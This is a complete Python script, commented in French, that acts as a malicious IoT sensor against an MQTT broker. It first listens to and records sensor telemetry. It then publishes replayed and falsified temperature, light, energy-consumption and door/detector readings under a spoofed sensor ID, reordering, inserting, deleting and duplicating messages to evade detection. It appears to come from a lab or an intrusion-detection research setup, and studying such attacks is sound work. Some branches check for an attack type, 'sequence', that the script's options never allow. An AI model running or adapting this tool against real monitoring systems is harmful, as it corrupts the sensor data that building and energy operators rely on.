import time
import sys
import random
import json
import paho.mqtt.client as mqtt
from datetime import datetime, timedelta
import socket
import math
import numpy as np
from collections import deque, defaultdict
import pickle
import os
import argparse
import pandas as pd

# Configuration du broker MQTT
broker = "192.168.2.1"
port = 1883

# Parser pour les arguments de ligne de commande
parser = argparse.ArgumentParser(description='Capteur malveillant- Replay, FDIA, Hybrid')
parser.add_argument('--id', default='sensor_evil', help='ID du capteur')
parser.add_argument('--attack', choices=['replay', 'fdia', 'hybrid'], 
                   default='hybrid', help='Type d\'attaque')
parser.add_argument('--duration', type=int, default=3600, help='Durée de l\'attaque en secondes')
parser.add_argument('--learn-time', type=int, default=300, help='Temps d\'apprentissage en secondes')
parser.add_argument('--manipulation-type', choices=['reorder', 'insert', 'delete', 'duplicate', 'hybrid'], 
                   default='hybrid', help='Type de manipulation pour fdia')
args = parser.parse_args()

id_sensor = args.id
attack_type = args.attack
duration = args.duration
learn_time = args.learn_time
manipulation_type = args.manipulation_type

# Création du client MQTT
client = mqtt.Client()
client.connect(broker, port, keepalive=60)
client.loop_start()

# Stockage des données pour toutes les attaques
learned_patterns = {    
    'daily_cycles': {},
    'weekly_patterns': {},
    'behavioral_fdia': deque(maxlen=1000),
    'correlation_matrix': np.zeros((7, 7))
}

# Stockage des séquences pour l'attaque de manipulation
original_fdia = deque(maxlen=2000)
fdia_patterns = defaultdict(list)

is_recording = True

def get_ip_local():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception as e:
        print(f"Erreur lors de la récupération de l'adresse IP : {e}")
        return "127.0.0.1"

def on_message(client, userdata, msg):
    #Callback pour enregistrer et apprendre les messages
    global learned_patterns, original_fdia, fdia_patterns, is_recording
    
    if is_recording:
        try:
            payload = json.loads(msg.payload.decode())
            
            # Apprendre pour replay
            learned_patterns['behavioral_fdia'].append(payload)
            
            # Enregistrer pour manipulation de séquence
            sequence_entry = {
                'payload': payload,
                'timestamp': datetime.now().isoformat(),
                'original_timestamp': payload.get('timestamp', ''),
                'sensor_id': payload.get('id_sensor', ''),
                'fdia_id': len(original_fdia)
            }
            original_fdia.append(sequence_entry)
            
            # Analyser les patterns de False data injection attacks
            fdia_patterns[id_sensor].append(sequence_entry)
            
            print(f"Message capture: {payload.get('id_sensor', 'unknown')} - {payload.get('timestamp', '')}")
        except Exception as e:
            print(f"Erreur lors de la capture: {e}")

# S'abonner au topic
client.on_message = on_message
client.subscribe("sensors/consommation/data_sensor")

def save_data():
    #Sauvegarde des donnees capturees
    # Sauvegarde des patterns appris
    patterns_data = []
    for hour, pattern in learned_patterns['daily_cycles'].items():
        patterns_data.append({
            'hour': hour,
            'temperature': pattern['temperature'],
            'light': pattern['light'],
            'consommation': pattern['consommation']
        })
    
    if patterns_data:
        patterns_df = pd.DataFrame(patterns_data)
        patterns_df.to_csv(f"{attack_type}_patterns.csv", index=False)
        print(f"Patterns sauvegardes dans {attack_type}_patterns.csv")
    
    # Sauvegarde des false data injection attacks originales
    fdia_data = []
    for seq in original_fdia:
        payload = seq['payload']
        fdia_data.append({
            'timestamp': seq['timestamp'],
            'original_timestamp': seq['original_timestamp'],
            'sensor_id': seq['sensor_id'],
            'fdia_id': seq['fdia_id'],
            'temperature': payload.get('data_sensor', {}).get('temperature', 0),
            'light': payload.get('data_sensor', {}).get('light', 0),
            'consommation': payload.get('consommation', 0),
            'detecteur': payload.get('detecteur', 'OFF'),
            'door': payload.get('door', 'OFF'),
            'connectivity': payload.get('connectivity', 'OFF')
        })
    
    if fdia_data:
        fdia_df = pd.DataFrame(fdia_data)
        fdia_df.to_csv(f"{attack_type}_fdia.csv", index=False)
        print(f"False data injection attacks sauvegardees dans {attack_type}_fdia.csv")
    
    # Sauvegarde aussi en pickle pour la compatibilite
    data = {
        'learned_patterns': learned_patterns,
        'original_fdia': list(original_fdia),
        'fdia_patterns': dict(fdia_patterns)
    }
    with open(f"{attack_type}_data.pkl", 'wb') as f:
        pickle.dump(data, f)
    print(f"Donnees completes sauvegardees dans {attack_type}_data.pkl")

def load_data():
    #Charge les donnees sauvegardees
    global learned_patterns, original_fdia, fdia_patterns
    
    # Charger les patterns depuis csv
    patterns_filename = f"{attack_type}_patterns.csv"
    if os.path.exists(patterns_filename):
        try:
            patterns_df = pd.read_csv(patterns_filename)
            for _, row in patterns_df.iterrows():
                learned_patterns['daily_cycles'][int(row['hour'])] = {
                    'temperature': row['temperature'],
                    'light': row['light'],
                    'consommation': row['consommation']
                }
            print(f"Patterns charges depuis {patterns_filename}: {len(learned_patterns['daily_cycles'])} heures")
        except Exception as e:
            print(f"Erreur lors du chargement des patterns csv: {e}")
    
    # Chargement des false data injection attacks depuis csv
    fdia_filename = f"{attack_type}_fdia.csv"
    if os.path.exists(fdia_filename):
        try:
            fdia_df = pd.read_csv(fdia_filename)
            for _, row in fdia_df.iterrows():
                fdia_entry = {
                    'timestamp': row['timestamp'],
                    'original_timestamp': row['original_timestamp'],
                    'sensor_id': row['sensor_id'],
                    'fdia_id': int(row['fdia_id']),
                    'payload': {
                        'data_sensor': {
                            'temperature': row['temperature'],
                            'light': row['light']
                        },
                        'consommation': row['consommation'],
                        'detecteur': row['detecteur'],
                        'door': row['door'],
                        'connectivity': row['connectivity']
                    }
                }
                original_fdia.append(fdia_entry)
                
                # Reconstruction des fdia_patterns
                sensor_id = row['sensor_id']
                fdia_patterns[sensor_id].append(fdia_entry)
            
            print(f"False data injection attacks charges depuis {fdia_filename}: {len(original_fdia)} false data injection attacks")
        except Exception as e:
            print(f"Erreur lors du chargement des false data injection attacks csv: {e}")
    
    # Chargement depuis pickle pour la compatibilite (si csv pas disponible)
    pickle_filename = f"{attack_type}_data.pkl"
    if os.path.exists(pickle_filename) and not original_fdia:
        try:
            with open(pickle_filename, 'rb') as f:
                data = pickle.load(f)
            learned_patterns.update(data.get('learned_patterns', {}))
            original_fdia.extend(data.get('original_fdia', []))
            fdia_patterns.update(data.get('fdia_patterns', {}))
            print(f"Donnees charges depuis pickle: {len(learned_patterns['behavioral_fdia'])} patterns, {len(original_fdia)} false data injection attacks")
        except Exception as e:
            print(f"Erreur lors du chargement pickle: {e}")
    
    return len(original_fdia) > 0 or len(learned_patterns['daily_cycles']) > 0

def analyze_patterns():
    #Analyse des patterns pour l'attaque replay
    if not learned_patterns['behavioral_fdia']:
        return
    
    # Analyse des cycles quotidiens
    hourly_data = {}
    for payload in learned_patterns['behavioral_fdia']:
        try:
            timestamp = datetime.fromisoformat(payload['timestamp'])
            hour = timestamp.hour
            
            if hour not in hourly_data:
                hourly_data[hour] = []
            
            data = payload['data_sensor']
            hourly_data[hour].append({
                'temperature': data['temperature'],
                'light': data['light'],
                'consommation': payload['consommation']
            })
        except:
            continue
    
    # Calcul des moyennes par heure
    for hour, data_list in hourly_data.items():
        if data_list:
            avg_temp = np.mean([d['temperature'] for d in data_list])
            avg_light = np.mean([d['light'] for d in data_list])
            avg_cons = np.mean([d['consommation'] for d in data_list])
            
            learned_patterns['daily_cycles'][hour] = {
                'temperature': avg_temp,
                'light': avg_light,
                'consommation': avg_cons
            }
    
    print(f"Patterns quotidiens analyses: {len(learned_patterns['daily_cycles'])} heures")

def replay_sensor(timestamp, attack_progress=0.0):
    #Generation des donnees replay basees sur les patterns appris
    dt = datetime.fromisoformat(timestamp)
    hour = dt.hour
    minute = dt.minute
    day_of_week = dt.weekday()
    
    # Utilisation des patterns appris si disponibles (avec modification pour attaque)
    if learned_patterns['daily_cycles'] and hour in learned_patterns['daily_cycles']:
        pattern = learned_patterns['daily_cycles'][hour]
        base_temp = pattern['temperature']
        base_light = pattern['light']
        base_cons = pattern['consommation']
    else:
        # Patterns par defaut si aucun pattern appris
        base_temp = 20 + 5 * math.sin((hour - 6) * math.pi / 12)
        base_light = 30 + 20 * math.sin((hour - 6) * math.pi / 12)
        base_cons = 7.0
    
    # Ajout des variations replay sophistiquees
    # Variations saisonnieres simulees
    seasonal_factor = math.sin((dt.timetuple().tm_yday - 80) * 2 * math.pi / 365)
    base_temp += 2 * seasonal_factor
    
    # Patterns meteorologiques simules
    weather_cycle = math.sin(hour * math.pi / 12) * math.cos(minute * math.pi / 30)
    base_light += 5 * weather_cycle
    
    # Patterns d'occupation humaine
    occupancy_pattern = 0
    if 7 <= hour <= 9:  # Matin
        occupancy_pattern = 0.8
    elif 12 <= hour <= 14:  # Dejeuner
        occupancy_pattern = 0.6
    elif 17 <= hour <= 19:  # Soiree
        occupancy_pattern = 0.9
    elif 22 <= hour or hour <= 6:  # Nuit
        occupancy_pattern = 0.1
    
    # Correlations entre capteurs
    temp_variation = random.gauss(0, 0.3)
    light_variation = random.gauss(0, 2)
    
    # Correlation temperature-luminosite
    if base_light > 50:  # Jour ensoleille
        temp_variation += 0.5
    else:  # Nuit ou temps couvert
        temp_variation -= 0.3
    
    # Patterns d'attaque sophistiquees
    attack_modulation = math.sin(attack_progress * math.pi) * 0.1
    
    # Generation des donnees finales
    temperature = base_temp + temp_variation + attack_modulation
    light = max(0, base_light + light_variation)
    consommation = base_cons + random.gauss(0, 0.5) + (occupancy_pattern * 2)
    
    # Etats binaires bases sur les patterns d'occupation
    detecteur_prob = 0.2 + (occupancy_pattern * 0.6)
    door_prob = 0.1 + (occupancy_pattern * 0.4)
    connectivity_prob = 0.95 if occupancy_pattern > 0.5 else 0.85
    
    return {
        "temperature": round(temperature, 2),
        "light": round(light, 2),
        "detecteur": "ON" if random.random() < detecteur_prob else "OFF",
        "door": "ON" if random.random() < door_prob else "OFF",
        "connectivity": "ON" if random.random() < connectivity_prob else "OFF"
    }, round(consommation, 2)

def manipulate_fdia_reorder(fdia, window_size=10):
    #Manipulation par reorganization de l'ordre
    if len(fdia) < window_size:
        return fdia
    
    window = list(fdia[-window_size:])
    sensor_groups = defaultdict(list)
    for seq in window:
        sensor_groups[seq['sensor_id']].append(seq)
    
    sensor_order = list(sensor_groups.keys())
    random.shuffle(sensor_order)
    
    reordered = []
    for sensor_id in sensor_order:
        reordered.extend(sensor_groups[sensor_id])
    
    return reordered

def manipulate_fdia_insert(fdia, insertion_rate=0.1):
    #Manipulation par insertion de false data injection attacks
    manipulated = []
    
    for seq in fdia:
        manipulated.append(seq)
        
        if random.random() < insertion_rate:
            fake_seq = create_fake_fdia(seq['sensor_id'])
            manipulated.append(fake_seq)
    
    return manipulated

def manipulate_fdia_delete(fdia, deletion_rate=0.05):
    #Manipulation par suppression de false data injection attacks
    return [seq for seq in fdia if random.random() > deletion_rate]

def manipulate_fdia_duplicate(fdia, duplication_rate=0.08):
    #Manipulation par duplication de false data injection attacks
    manipulated = []
    
    for seq in fdia:
        manipulated.append(seq)
        
        if random.random() < duplication_rate:
            duplicated_seq = seq.copy()
            duplicated_seq['timestamp'] = datetime.now().isoformat()
            duplicated_seq['payload'] = duplicated_seq['payload'].copy()
            duplicated_seq['payload']['timestamp'] = duplicated_seq['timestamp']
            manipulated.append(duplicated_seq)
    
    return manipulated

def create_fake_fdia(sensor_id):
    #Creation d'une false data injection attack factice
    timestamp = datetime.now()
    data_sensor = {
        "temperature": 20 + random.gauss(0, 2),
        "light": 30 + random.gauss(0, 10),
        "detecteur": "ON" if random.random() < 0.7 else "OFF",
        "door": "ON" if random.random() < 0.3 else "OFF",
        "connectivity": "ON"
    }
    
    return {
        'payload': {
            "id_sensor": sensor_id,
            "state_topic": "sensors/consommation/data_sensor",
            "timestamp": timestamp.isoformat(),
            "consommation": 7.0 + random.gauss(0, 1),
            "unit_of_measurement": "kWh",
            "data_sensor": data_sensor,
            "ip_source": get_ip_local()
        },
        'timestamp': timestamp.isoformat(),
        'original_timestamp': timestamp.isoformat(),
        'sensor_id': sensor_id,
        'fdia_id': -1
    }

def manipulate_fdia_hybrid(fdia):
    #Manipulation hybride combinant plusieurs techniques
    manipulated = fdia.copy()
    
    if len(manipulated) >= 10:
        manipulated = manipulate_fdia_reorder(manipulated, 10)
    
    manipulated = manipulate_fdia_insert(manipulated, 0.05)
    manipulated = manipulate_fdia_delete(manipulated, 0.03)
    manipulated = manipulate_fdia_duplicate(manipulated, 0.04)
    
    return manipulated

def generate_fake_fdia():
    #Generation des false data injection attacks factices si aucune n'est enregistree
    print("Generation de false data injection attacks factices")
    
    for i in range(100):
        timestamp = datetime.now() + timedelta(seconds=i)
        data_sensor = {
            "temperature": 20 + 5 * math.sin(i * math.pi / 50) + random.gauss(0, 0.5),
            "light": 30 + 20 * math.sin(i * math.pi / 50) + random.gauss(0, 2),
            "detecteur": "ON" if random.random() < 0.7 else "OFF",
            "door": "ON" if random.random() < 0.3 else "OFF",
            "connectivity": "ON"
        }
        
        fake_message = {
            'payload': {
                "id_sensor": f"sensor_{i % 5}",
                "state_topic": "sensors/consommation/data_sensor",
                "timestamp": timestamp.isoformat(),
                "consommation": 7.0 + random.gauss(0, 1),
                "unit_of_measurement": "kWh",
                "data_sensor": data_sensor,
                "ip_source": get_ip_local()
            },
            'timestamp': timestamp.isoformat(),
            'original_timestamp': timestamp.isoformat(),
            'sensor_id': f"sensor_{i % 5}",
            'fdia_id': i
        }
        
        original_fdia.append(fake_message)
        fdia_patterns[f"sensor_{i % 5}"].append(fake_message)

def launch_attack():
    #Lancement de l'attaque selectionnee
    global is_recording
    
    print(f"Demarrage de l'attaque {attack_type}")
    is_recording = False
    
    # Charger les donnees si disponibles
    if not load_data():
        print("Aucune donnee chargee. Generation de donnees factices")
        generate_fake_fdia()
    
    # Analyse des patterns pour replay
    if attack_type in ['replay', 'hybrid']:
        analyze_patterns()
    
    start_time = time.time()
    ip_source = get_ip_local()
    topic = "sensors/consommation/data_sensor"
    
    attack_progress = 0
    last_progress_update = start_time
    
    while time.time() - start_time < duration:
        current_time = time.time()
        timestamp = datetime.now().isoformat()
        
        # Mise a jour de la progression
        if current_time - last_progress_update > 60:
            attack_progress = min(1.0, (current_time - start_time) / duration)
            last_progress_update = current_time
        
        if attack_type == 'replay':
            # Attaque replay
            data_sensor, consommation = replay_sensor(timestamp, attack_progress)
            message = {
                "id_sensor": id_sensor,
                "state_topic": topic,
                "timestamp": timestamp,
                "consommation": consommation,
                "unit_of_measurement": "kWh",
                "data_sensor": data_sensor,
                "ip_source": ip_source
            }
            client.publish(topic, json.dumps(message))
            print(f"Replay: {id_sensor} - {timestamp} - Temp: {data_sensor['temperature']:.1f}°C")
        
        elif attack_type == 'fdia':
            # Attaque de manipulation de sequence
            if not original_fdia:
                break
            
            # Selectionner une fenetre de sequences a manipuler
            window_size = min(20, len(original_fdia))
            if window_size == 0:
                break
            
            start_idx = random.randint(0, len(original_fdia) - window_size)
            window = list(original_fdia)[start_idx:start_idx + window_size]
            
            # Appliquer la manipulation selon le type
            if manipulation_type == 'reorder':
                manipulated_window = manipulate_fdia_reorder(window)
            elif manipulation_type == 'insert':
                manipulated_window = manipulate_fdia_insert(window)
            elif manipulation_type == 'delete':
                manipulated_window = manipulate_fdia_delete(window)
            elif manipulation_type == 'duplicate':
                manipulated_window = manipulate_fdia_duplicate(window)
            elif manipulation_type == 'hybrid':
                manipulated_window = manipulate_fdia_hybrid(window)
            else:
                manipulated_window = window
            
            # Envoyer les false data injection attacks manipulees
            for seq in manipulated_window:
                payload = seq['payload'].copy()
                payload['timestamp'] = datetime.now().isoformat()
                payload['id_sensor'] = id_sensor
                payload['ip_source'] = ip_source
                
                if 'data_sensor' in payload:
                    data_sensor = payload['data_sensor'].copy()
                    data_sensor['temperature'] += random.gauss(0, 0.1)
                    data_sensor['light'] += random.gauss(0, 0.5)
                    payload['data_sensor'] = data_sensor
                
                client.publish(topic, json.dumps(payload))
                print(f"False data injection attack {manipulation_type}: {id_sensor} - {payload['timestamp']}")
                
                interval = random.uniform(0.1, 0.3)
                time.sleep(interval)
            
            time.sleep(random.uniform(1, 3))
        
        elif attack_type == 'hybrid':
            # Attaque hybride (combine replay et fdia)
            if random.random() < 0.7:  # 70% replay, 30% fdia
                data_sensor, consommation = replay_sensor(timestamp, attack_progress)
                message = {
                    "id_sensor": id_sensor,
                    "state_topic": topic,
                    "timestamp": timestamp,
                    "consommation": consommation,
                    "unit_of_measurement": "kWh",
                    "data_sensor": data_sensor,
                    "ip_source": ip_source
                }
                client.publish(topic, json.dumps(message))
                print(f"Hybrid-Replay: {id_sensor} - {timestamp}")
            else:
                # Sequence occasionnel
                if original_fdia:
                    window_size = min(10, len(original_fdia))
                    if window_size > 0:
                        start_idx = random.randint(0, len(original_fdia) - window_size)
                        window = list(original_fdia)[start_idx:start_idx + window_size]
                        manipulated_window = manipulate_fdia_hybrid(window)
                        
                        for seq in manipulated_window[:3]:  
                            payload = seq['payload'].copy()
                            payload['timestamp'] = datetime.now().isoformat()
                            payload['id_sensor'] = id_sensor
                            payload['ip_source'] = ip_source
                            client.publish(topic, json.dumps(payload))
                            print(f"Hybrid-False data injection attack: {id_sensor} - {payload['timestamp']}")
        
        # Intervalle variable selon le type d'attaque
        if attack_type == 'sequence':
            interval = random.uniform(0.2, 0.5)
        elif attack_type == 'hybrid':
            interval = random.uniform(0.1, 0.3)
        else:
            interval = random.uniform(0.05, 0.2)
        
        time.sleep(interval)

def main():
    print(f"Capteur malveillant: {id_sensor}")
    print(f"Type d'attaque: {attack_type}")
    if attack_type == 'sequence':
        print(f"Type de manipulation: {manipulation_type}")
    print(f"Duree: {duration} secondes")
    print(f"Temps d'apprentissage: {learn_time} secondes")
    print("="*60)
    
    try:
        # Phase 1: Apprentissage/Enregistrement
        print(f"1ere Phase: Apprentissage des patterns ({learn_time} secondes)")
        time.sleep(learn_time)
        
        # Sauvegarder les donnees apprises
        save_data()
        
        # Phase 2: Attaque
        print("2eme Phase: Lancement de l'attaque")
        launch_attack()
        
    except KeyboardInterrupt:
        print("Attaque interrompue")
        save_data()
    finally:
        client.disconnect()

if __name__ == "__main__":
    main() 